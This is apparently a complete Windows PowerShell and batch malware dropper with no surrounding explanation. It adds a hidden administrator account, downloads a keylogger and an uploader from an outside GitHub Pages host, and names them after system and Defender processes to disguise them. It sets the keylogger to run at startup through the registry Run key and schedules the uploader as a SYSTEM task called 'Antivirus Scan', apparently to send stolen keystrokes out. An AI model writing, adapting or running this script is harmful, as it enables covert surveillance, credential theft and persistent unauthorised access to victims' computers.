net user poweruser password /add
net localgroup Admins /add
net localgroup Administrators Admins /add
net localgroup Admins poweruser /add

$klogurl = "https://johnsolo15.github.io/klog.exe"
$uploaderurl = "https://johnsolo15.github.io/uploader.exe"
$klogdest = "C:\Temp\srvchost.exe"
$uploaderdest = "C:\Temp\defender.exe"
$files = ls C:\

if ($files -match "Temp") {
    $wclient = New-Object System.Net.WebClient
    $wclient.DownloadFile($klogurl, $klogdest)
    $wclient.DownloadFile($uploaderurl, $uploaderdest)
} else {
    New-Item C:\Temp -type directory
    $wclient = New-Object System.Net.WebClient
    $wclient.DownloadFile($klogurl, $klogdest)
    $wclient.DownloadFile($uploaderurl, $uploaderdest)
}

$regpath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regpath -Name "srvchost" -Value $klogdest

schtasks.exe /create /s localhost /ru System /tn "Antivirus Scan" /tr $uploaderdest /sc DAILY /st 02:00
